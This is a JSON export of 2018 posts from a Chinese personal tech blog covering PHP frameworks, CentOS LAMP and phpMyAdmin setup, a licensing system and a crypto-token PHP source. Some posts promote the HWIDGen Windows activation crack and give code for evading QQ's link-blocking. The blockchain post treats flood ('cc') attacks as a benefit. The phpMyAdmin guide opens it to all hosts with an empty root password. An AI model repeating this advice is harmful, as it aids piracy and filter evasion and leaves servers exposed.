MVC框架中，怎样去选择一款各方面都不错的框架学习并在项目中使用它？这是每一个PHPer都会面临的问题。比如当前比较流行的框架有：ZendFrameWork、ThinkPHP（国产）、CodeIgniter、YII等。每个人心目中的好坏标准不一样，再加上有的人习惯了某框架，想让他再接受其优秀的框架也是比较难的。所以，我们应该怎样去判断一款框架是否属于自己，变得非常的突出。现在我给出几个标准：\n性能\n所谓的性能指的是IO、CPU占用、PHP解析时间等几个指标。当前的服务器最突出的问题是CPU已经非常快了，内存已经够大够便宜了，唯独硬盘IO不够高。这就像一个一个智商150与一个智商80的人做1+1一样，根本体现不出智商的优越性。\n全栈式\n虽然我个人不太赞成PHP框架过度全栈式。但是，如果能把全栈式做到优雅简洁，我也是非常兴奋的。什么是全栈式？就是一款框架包含了WEB开发中所有的东西。比如：上传、分页、导入导出、邮件、日志、错误、二维码、RSS、RBAC等。这样的话，才能真正解决掉我们去自己实现的麻烦，节省我们的时间。也提高了代码的安全性移植性。\n学习难度是否陡峭\n毕竟我们要运用到实际的项目中。以后陆续还会添加更多的人进入项目开发中。如果，学习难度过于陡峭，势必会影响项目的进度和后期维护的成本。目前，我用过的框架中ThinkPHP做得还不错，文档还比较完整易懂。换作正在用的YII框架，简直是头痛。提供的文档实在是过于简单，示例不够丰富。而且，代码不够优雅。在某些设计上，过于面向对象，导致在PHP这种语言中操作起来不是特别顺手。\n框架社会是否活跃\n一个社区活跃与否，直接关系到这个框架的未来的命运。谁也不希望今天还牛逼的框架，就因为没有与时俱进，最终淹没在历史的长河中。自己又得花时间掌握新框架。比如：前几天MongoDB还是比较火的时候，当时几乎没有框架在DB层，即ORM实现这个数据库的接口。而项目中可能会考虑使用MongoDB。当时几个比较知名的且速度比较过得去的框架都没有支持。结果，还是咱们国产的ThinkPHP支持了。虽然，BUG可能有点多。至少，某种程度说明了一个活跃的社区是非常有必要的。\n框架使用的群体大小\n一款框架再牛逼，如果没有人使用。你学了也只能在自己的一亩三分地有所建树。出了这个圈，效果就不明显了。PHPer学习这个东西，主要还是为了能找一份高薪顺手的工作。如果，学了半天，结果却没有人用这个框架在项目中。那是相当悲催的。\n总之归为一点，选择自己适合的，例如CI、tp等框架\n","date":"2018-05-29T03:51:00Z","permalink":"https://blog.aaayun.cc/archives/89.html","title":"PHP框架的理解"},{"content":"\n源码介绍： 1.增加时间限制\n2.增加授权到期短信提醒\n3.重写黑名单系统\n4.增加二次认证\n注：使用本系统必须开启rewrite模块，否则会使用失败，此授权系统使用AYPHP1.3框架\n此系统去除了在线打包下载以及QQ扫描验证，采用了短信sdk更适合商业用途，此系统将不定时更新，如发现漏洞请及时反馈\n使用方法：\n1.安装需要把auth.sql导入数据库\n2.更改/application/Configs/database.php，这是链接数据库的参数，必须更改\n3.把核心代码复制到你需要授权的系统数据库操作文件\n4.监控http://域名//Job/index/key=密匙(监控速度无需多快)\n密匙在后台更改\n5.把tool.php放在源码根目录中【非必须】\n(此源码方便放置密匙，如果核心代码密匙路径更改，此源码密匙路径也要更改)\n6.使用短信sdk需在ay/common/sms/sms100.php更改key以及模板参数，获取key请登入100sms.cn\n用户授权只需按时缴纳费用和放置密匙即可正常访问网站，\n如授权即将到期本程序将自动下发短信给用户让缴费，\n密匙防止已授权用户将自己的授权源码给他人使用的黑名单系统\n注意网站运行后/readme目录需删除\n下载直通车\n","date":"2018-05-29T00:56:00Z","permalink":"https://blog.aaayun.cc/archives/84.html","title":"轻风云授权系统1.0"},{"content":"HWIDGEN是一款由国外Nsane论坛会员s1ave77制作的Windows 10数字权利激活工具，这款Win10数字权利获取工具，可以自动获取Windows 10 数字许可证激活，无需产品密钥，以最简单的方式永久激活。\n什么是“数字权利激活”？数字许可证激活是 Windows 10 中新加入的激活方式，是一种授权方法的分类。数字许可证会记录您的硬件设备信息，只要在CPU和主板设备没有更换的情况下就可以连接微软服务器自动永久性的激活系统，重新安装系统时无需再次输入产品密钥，安装后会自动永久激活。“数字权利激活”在不更换电脑硬件的情况下一直有效，无论您安装的系统是正式版还是预览版，不影响永久激活效果。\n支持Windows 10 版本 (SKUs): Core (Home) (N) CoreSingleLanguage (N) Professional (N) ProfessionalEducation (N) ProfessionalWorkstation (N) Education (N) Enterprise (N) EnterpriseS (N) 新版变化 [Windows 10] Digital License (HWID) Generation without KMS or predecessor install/upgrade \u0026lt;URL_ADDRESShttp://www.nsaneforums.com/topic/312871-windows-10-digital-license-hwid-generation-without-kms-or-predecessor-installupgrade/ 下载直通车\n","date":"2018-05-26T17:12:00Z","permalink":"https://blog.aaayun.cc/archives/97.html","title":"Win10数字激活神器HWIDGen v9.32 汉化版"},{"content":"如果你想在后台更改页面底部代码，而其中有html代码，输入框显示不出源代码，pre标签又没有用，那么你不防试试下面的函数\n1 2 3 4 5 6 7 8 9 function UNHTML($content){ $content=htmlspecialchars($content); $content=str_ireplace(chr(13),\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,$content); $content=str_ireplace(chr(32),\u0026#34; \u0026#34;,$content); $content=str_ireplace(\u0026#34;[_[\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,$content); $content=str_ireplace(\u0026#34;)_)\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,$content); $content=str_ireplace(\u0026#34;|_|\u0026#34;,\u0026#34; \u0026#34;,$content); return trim($content); } ","date":"2018-05-10T02:50:00Z","permalink":"https://blog.aaayun.cc/archives/79.html","title":"php显示html源代码函数"},{"content":"QQ防红并跳转默认浏览器方法，下列代码请加入全局文件中\n1 2 3 4 5 if (strpos($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;QQ/\u0026#39;) !== false and $type == \u0026#34;ture\u0026#34;) { exit(\u0026#39;\u0026lt;script src=\u0026#34;https://open.mobile.qq.com/sdk/qqapi.js?_bid=152\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;请从浏览器内打开本站\u0026#34;);mqq.ui.openUrl({ target: 2,url: \u0026#34;http://\u0026#39;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;REQUEST_URI\u0026#39;].\u0026#39;\u0026#34;});\u0026lt;/script\u0026gt;\u0026#39;); } ","date":"2018-05-10T02:36:00Z","permalink":"https://blog.aaayun.cc/archives/76.html","title":"QQ防红代码"},{"content":"构思一个半中心化区块链，由于没有xmind就码字了\n1.管理员在服务器增加n个区块，并设置简易度\n2.用户在客户端注册账号取得钱包地址、私匙及公匙\n3.用户客户端选择区块并进行hash计算，成功计算将提交服务器进行随机奖励至钱包\n4.交易、挖矿信息以对称式加密提交区块浏览器中，并以p2p形式传给其它用户保存至本地形成所谓的账本\n5.交易转账须查找账本记录，51%账本记录无异议将成功交易，并扣除旷工费\n区块可以创建在百度贴吧等平台，这样大大减少服务器成本又能实现cc攻击\n整个过程实现须使用php、java或易语言及易安卓\n","date":"2018-05-08T00:13:16Z","permalink":"https://blog.aaayun.cc/archives/75.html","title":"半中心化区块链"},{"content":"\n网盘：直通车\n密码: 36gs\n","date":"2018-04-24T00:11:00Z","permalink":"https://blog.aaayun.cc/archives/69.html","title":"价值1680元的python实战教程"},{"content":"一年前我就不应该插手稻香村的事情\n","date":"2018-04-24T00:07:00Z","permalink":"https://blog.aaayun.cc/archives/66.html","title":"插手"},{"content":"2014年初入C语言门槛，因为底层开发不喜欢放弃了\n2015年进攻VB，因为VB的兼容性太差放弃了\n2016年上旬进攻易语言和易安卓，最后放弃了，因为各大厂商都报毒，强制性删除源文件\n2016年下旬，进攻java，但Java效率低太繁琐虽然跨平台但最后还是放弃了\n2017年进攻PHP，感觉找到了正确的方向，一直到现在仍在不断深入\n有人说你学这么多语言思维不混乱吗？答案是会的，但只要熟悉了，你就会发现这种错误会慢慢减少，而且大部分语言初入时变量的定义和使用都差不多\n现在，最好的学习方向是Python，现在很火，你可以赶赶热潮过去分一口汤，Python可以做大数据开发也可以开发网站等，用途广泛\n","date":"2018-04-08T19:05:29Z","permalink":"https://blog.aaayun.cc/archives/63.html","title":"学习经历"},{"content":" 此源码已停止更新，仍可下载使用**\n程序用途\n生产自己的代币用于交易\n博主本人也是一个PHP爱好者，最近看区块链这块很火，于是分别在GEC、HBC等平台注册了几个账号，分析了他们的运行原理发现并不难做出来，于是自己就开发了一个开源程序，供大家参考，目前暂未发现bug，好了废话不多说，来介绍本系统：\n使用bs框架快速开发后台，前台采集hbc模板（博主不会前端），采用session，引入360安全脚本，使用短信sdk，因为zc原因，不采用充值及线上交易，全自动化跌涨\n使用方法：\n1.修改 /cron/sms.php 填写短信sdk密匙，这里使用的是100sms短信平台的sdk\n2.源码上传网站根目录，访问 域名/install/ 一键自动安装\n访问 监控 域名/admin 进入后台设置监控密匙\n（后台初始账号：admin 密码：123456）\n3.监控 域名/cron/date.php?key=你的密匙\n4.监控 域名/cron/host.php?key=你的密匙\n点我下载\n邮箱：admin@aaayun.cc\n注：源码开源免费，如果想找博主增加功能需收费\n此源码由Anderyly发布，未经授权禁止商业用途\n","date":"2018-03-29T20:10:00Z","permalink":"https://blog.aaayun.cc/archives/40.html","title":"vax虚拟币系统PHP源码"},{"content":"1、安装apache\n1.1 安装apache\n1 yum install httpd httpd-devel 1.2 启动apache服务\n1 systemcti start httpd 1.3 设置httpd服务开机启动\n1 systemctl enable httpd 1.4 防火墙设置开启80端口\n1 2 3 4 5 6 firewall-cmd --permanent --zone=public --add-service=http success firewall-cmd --permanent --zone=public --add-service=https success firewall-cmd --reload success 2、安装mysql\n2.1 安装mysql\n1 yum install mariadb mariadb-server mariadb-libs mariadb-devel 2.2 开启mysql\n1 systemctl start mariadb 2.3 设置mysql服务开机启动\n1 systemctl enable mariadb 2.4 数据库安全设置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY! In order to log into MariaDB to secure it, we\u0026#39;ll need the current password for the root user. If you\u0026#39;ve just installed MariaDB, and you haven\u0026#39;t set the root password yet, the password will be blank, so you should just press enter here. Enter current password for root (enter for none): OK, successfully used password, moving on... Setting the root password ensures that nobody can log into the MariaDB root user without the proper authorisation. Set root password? [Y/n] y New password: Re-enter new password: Password updated successfully! Reloading privilege tables.. ... Success!s By default, a MariaDB installation has an anonymous user, allowing anyone to log into MariaDB without having to have a user account created for them. This is intended only for testing, and to make the installation go a bit smoother. You should remove them before moving into a production environment. Remove anonymous users? [Y/n] y ... Success! Normally, root should only be allowed to connect from \u0026#39;localhost\u0026#39;. This ensures that someone cannot guess at the root password from the network. Disallow root login remotely? [Y/n] n ... skipping. By default, MariaDB comes with a database named \u0026#39;test\u0026#39; that anyone can access. This is also intended only for testing, and should be removed before moving into a production environment. Remove test database and access to it? [Y/n] y - Dropping test database... ... Success! - Removing privileges on test database... ... Success! Reloading the privilege tables will ensure that all changes made so far will take effect immediately. Reload privilege tables now? [Y/n] y ... Success! Cleaning up... All done! If you\u0026#39;ve completed all of the above steps, your MariaDB installation should now be secure. Thanks for using MariaDB! 3、安装PHP\n3.1 安装php\n1 yum -y install php 3.2 将php与mysql关联 1 yum install php-mysql 3.3 安装常用PHP模块 1 yum install -y php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap curl curl-devel php-bcmath 3.4 重启apache服务器 1 systemctl restart http 现在centos7下lamp环境就已经安装完毕\n","date":"2018-03-26T06:03:00Z","permalink":"https://blog.aaayun.cc/archives/37.html","title":"centos7快速搭建LAMP"},{"content":"CentOS默认源里没有ntfs3g，想要添加ntfs支持，无非是自己下载编译安装或者加源yum安装\n添加aliyun的epel源来yum安装的方式，简单易行\n1、加源\n1 wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo 2、安装\n1 2 yum update;yum install ntfs-3g yum install ntfs-3g ","date":"2018-03-26T05:10:00Z","permalink":"https://blog.aaayun.cc/archives/30.html","title":"centos7中解决无法识别ntfs格式"},{"content":"首先服务器要有web 环境\n1 yum install phpmyadmin 有时候会安装不成功，提示没有可用软件包，则需要安装Remi源\n1 2 yum install epel-release rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm 修改配置\n1 vim /etc/httpd/conf.d/phpMyadmin.conf 将 Require ip 127.0.0.1 Require ip ::1 注释\n添加Require all granted\n即可在浏览器本地通过localhost/phpmyadmin 访问\n修改配置\n1 vim /etc/phpMyAdmin/config.inc.php 1 2 3 4 5 6 7 8 9 10 11 $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;host\u0026#39;] = \u0026#39;localhost\u0026#39;; //设定MySQL所在的主机名或IP地址。如127.0.0.1这步很重要 $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;auth_type\u0026#39;] = \u0026#39;cookie\u0026#39;; // 设定进入phpMyAdmin管理MySQL的方式，共有三个选项：config、http、cookie。config是按配置文件登录，为默认方式， 无需任何确认；http是使用HTTP登录管理，在Apache模块安装下才能支持；cookie是最通用的管理方式。后两种方式的用户名和密码都是直接到数据库中验证。 $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;user\u0026#39;] = \u0026#39;root\u0026#39; ; //设定管理MySQL的账号。 $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;password\u0026#39;] = \u0026#39;\u0026#39; ; //设定管理MySQL的密码。 设置完成后，保存config.inc.php文件，重启Apache，测试：访问http://localhost/phpMyAdmin/\n如果访问报错如下图：\n不慌这种情况是给phpMyAdmin目录的权限太高，给755权限就不会报错了\n1 chmod -R 755 /etc/phpMyadmin ","date":"2018-03-25T05:23:00Z","permalink":"https://blog.aaayun.cc/archives/27.html","title":"centos7安装phpmyadmin"},{"content":"因整改内容暂无\n","date":"2018-03-19T19:30:00Z","permalink":"https://blog.aaayun.cc/?p=11/","title":"ssr科学上网附ssr服务器搭建"},{"content":"此系统有哪些特点\n目前支持的域名解析平台有\ndnspod\ncloudxns\naliyun\ndnscom\ndnsla\n多用户、多域名、多平台同时存在\n界面简单、舒适，操作简单\n2.1.1更新说明 (20170606)\n1、增加解析线路的选择\n2.1更新说明 （20170605）\n1、增加首页顶部自定义代码\n2、增加对dns.la解析平台的支持\n2.0版本更新说明 （20170604）\n1、此版本基本上完全重写，暂未提供以前版本升级方案\n2、程序框架使用的ThinkPHP 5.0.7\n3、此版本修复了之前版本的很多BUG问题\n4、新增加用户分组，可以设置每个域名能由那些分组成员解析\n5、新增加用户金币功能，后台可以设置每条解析扣除多少金币，以控制用户解析量\n安装说明\n1、由于此程序是在ThinkPHP框架基础上完成开发，所以安装环境有以下要求\nPHP+MYSQL\nPHP版本》=5.4 * 支持PATH_INFO模式 （PS:如果进后台出现404错误，基本上就是不支PATH_INFO的原因）\n下载地址：\nhttps://github.com/klsf/kldns/archive/2.1.zip\nGitHub地址：https://github.com/klsf/kldns\n","date":"2018-03-19T04:19:00Z","permalink":"https://blog.aaayun.cc/archives/8.html","title":"快乐二级域名分发系统v2.1.1"},{"content":"轻风云博客已经存于二年多了，这两年多的时间博客经历了大大小小的曲折，从原先的十七之家(17my.net)变成现在的地址，换了不少服务器，丢失了绝大数数据，从现在起，全新使用博客，不再使用之前的数据\n","date":"2018-03-17T20:03:00Z","permalink":"https://blog.aaayun.cc/archives/7.html","title":"关于博客"}]